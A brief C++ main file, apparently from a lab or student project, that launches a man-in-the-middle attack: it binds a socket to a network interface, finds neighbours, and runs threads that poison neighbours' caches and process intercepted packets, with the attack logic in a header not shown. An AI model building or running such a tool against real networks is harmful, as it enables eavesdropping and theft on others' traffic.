#include <iostream>
#include <string>
#include <thread>
#include <unistd.h>
#include "../header/mitmAttack.h"

int main()
{
    mitmAttack mitm;
    mitm.setupSocket("enp0s17");
    mitm.getNeighbours();
    // make a thread for poisonNeighbours
    std::thread poisonNeighboursThread(&mitmAttack::poisonNeighbours, &mitm);
    sleep(3);
    std::cerr << "[INFO] main: start processPackets" << std::endl;
    std::thread processPacketsThread(&mitmAttack::processPackets, &mitm);

    poisonNeighboursThread.join();
    processPacketsThread.join();
}